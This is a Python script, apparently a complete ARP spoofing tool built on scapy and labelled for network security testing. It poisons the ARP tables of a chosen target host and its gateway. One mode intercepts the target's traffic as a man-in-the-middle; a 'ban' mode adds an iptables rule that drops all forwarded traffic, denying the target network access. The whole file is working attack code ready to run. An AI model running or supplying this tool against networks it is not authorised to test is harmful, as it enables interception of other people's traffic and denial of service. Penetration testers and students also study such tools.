#! /usr/bin/python3

import sys
import getopt
import os
import threading
import time
import signal
from scapy.layers.l2 import *
from scapy.all import *

target_ip = ""
gateway_ip = ""
interface = ""
spoof = False
ban = False

def usage():
    print("ARP Spoofing Tool - Network Security Testing")
    print("Usage: sudo python3 arpspoof.py -t TARGET -g GATEWAY -i INTERFACE -s|-b")
    print()
    print("Required Arguments:")
    print("  -t, --target_ip    Target IP address to spoof")
    print("  -g, --gateway_ip   Gateway/Router IP address")
    print("  -i, --interface    Network interface")
    print()
    print("Operation Mode:")
    print("  -s, --spoof        ARP spoofing mode (man-in-the-middle)")
    print("  -b, --ban          ARP ban mode (denial of service)")
    print()
    print("Examples:")
    print("  sudo python3 arpspoof.py -t 192.168.1.7 -g 192.168.1.1 -i eth0 -s")
    print("  sudo python3 arpspoof.py -t 192.168.1.7 -g 192.168.1.1 -i eth0 -b")
    print()
    print("Note: Requires root privileges and scapy library")
    sys.exit(0)

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac
    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac
    print("[*] Beginning the ARP poison. [CTRL-C to stop]")
    while True:
        try:
            send(poison_target)
            send(poison_gateway)
            time.sleep(1)
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
            print("[*] ARP poison attack finished.")
            return

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Restoring target...")
    restore_target = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwsrc=gateway_mac, hwdst="ff:ff:ff:ff:ff:ff")
    restore_gateway = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwsrc=target_mac, hwdst="ff:ff:ff:ff:ff:ff")
    send(restore_target, count=5)
    send(restore_gateway, count=5)
    os.kill(os.getpid(), signal.SIGINT)

def get_mac(ip_address):
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)
    for s, r in responses:
        return r[Ether].src
    return None

def block_traffic():
    os.system("iptables -A FORWARD -j DROP")
    print("[*] All traffic is now blocked.")

def unblock_traffic():
    os.system("iptables -F")
    print("[*] All traffic is now unblocked.")

def main():
    global target_ip
    global gateway_ip
    global interface
    global spoof
    global ban

    if not len(sys.argv[1:]):
        usage()

    try:
        opts, args = getopt.getopt(sys.argv[1:], "ht:g:i:sb", ["help", "target_ip", "gateway_ip", "interface", "spoof", "ban"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-t", "--target_ip"):
            target_ip = a
        elif o in ("-g", "--gateway_ip"):
            gateway_ip = a
        elif o in ("-i", "--interface"):
            interface = a
        elif o in ("-s", "--spoof"):
            spoof = True
        elif o in ("-b", "--ban"):
            ban = True
        else:
            print("flag provided but not defined: ", a)
            usage()

    if not len(target_ip) or not len(gateway_ip) or not len(interface):
        usage()
    elif not spoof and not ban:
        usage()

    conf.iface = interface
    conf.verb = 0
    print("[*] Setting up " + interface)

    target_mac = get_mac(target_ip)
    if target_mac is None:
        print("[!!!] Failed to get target MAC. Exiting.")
        sys.exit(0)
    else:
        print("[*] Target " + target_ip + " is at " + target_mac)

    gateway_mac = get_mac(gateway_ip)
    if gateway_mac is None:
        print("[!!!] Failed to get gateway MAC. Exiting.")
        sys.exit(0)
    else:
        print("[*] Gateway " + gateway_ip + " is at " + gateway_mac)

    if spoof:
        poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
        poison_thread.start()
        try:
            print("[*] ARP spoofing running... Press CTRL+C to stop")
            signal.pause()
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

    elif ban:
        poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
        poison_thread.start()
        try:
            print("[*] ARP ban active... Press CTRL+C to stop")
            block_traffic()
            while True:
                time.sleep(2)
        except KeyboardInterrupt:
            unblock_traffic()
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

if __name__ == "__main__":
    main()